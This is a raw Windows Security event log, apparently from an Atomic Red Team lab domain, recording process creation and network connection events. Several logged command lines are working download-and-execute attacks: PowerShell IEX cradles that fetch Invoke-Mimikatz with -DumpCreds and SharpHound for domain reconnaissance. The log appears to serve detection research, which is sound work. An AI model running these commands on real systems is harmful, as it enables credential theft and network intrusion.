OpCode=Info
RecordNumber=1382095
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		51573
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:20 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382106
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1fe0
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Exit Status:	0x0
03/01/2021 10:53:20 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382105
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x20ac
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Exit Status:	0x0
03/01/2021 10:53:20 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382104
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x20ac
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1fe0
	Creator Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Process Command Line:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\2\RESC8EB.tmp" "c:\Users\Administrator\AppData\Local\Temp\2\4fuahqur\CSC5D1B3DB0F9FD4679A7701ADBE835108E.TMP"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:20 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382103
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1fe0
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\2\4fuahqur\4fuahqur.cmdline"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:20 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382102
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1054
	Process Name:	C:\Windows\System32\whoami.exe
	Exit Status:	0x0
03/01/2021 10:53:20 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382101
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1054
	New Process Name:	C:\Windows\System32\whoami.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\whoami.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:20 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382100
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x202c
	Process Name:	C:\Windows\System32\HOSTNAME.EXE
	Exit Status:	0x0
03/01/2021 10:53:20 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382099
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x202c
	New Process Name:	C:\Windows\System32\HOSTNAME.EXE
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\HOSTNAME.EXE"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:20 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382098
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55114
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:20 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382097
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55114
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382117
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1af0
	Process Name:	C:\Windows\System32\cmd.exe
	Exit Status:	0x1
03/01/2021 10:53:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382116
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1c3c
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x1
03/01/2021 10:53:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382115
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59315
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382114
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		7228
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55115
	Destination Address:	185.199.110.133
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382113
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		7228
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55115
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382112
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59239
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382111
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382110
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382109
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382108
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1c3c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1af0
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382107
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1af0
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:22 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382118
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1afc
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {write-host \""Import and Execution of SharpHound.ps1 from C:\AtomicRedTeam\atomics\T1059.001\src\"" -ForegroundColor Cyan
import-module C:\AtomicRedTeam\atomics\T1059.001\src\SharpHound.ps1
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:24 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382122
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59719
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:24 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382121
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:24 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382120
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:24 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382119
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:25 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382126
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60550
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:25 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382125
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55116
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:25 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382124
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55116
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:25 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382123
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:27 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382130
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		6264
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55117
	Destination Address:	185.199.110.133
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:27 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382129
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		6264
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55117
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:27 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382128
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1878
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {write-host \""Remote download of SharpHound.ps1 into memory, followed by execution of the script\"" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:27 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382127
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1afc
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:53:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
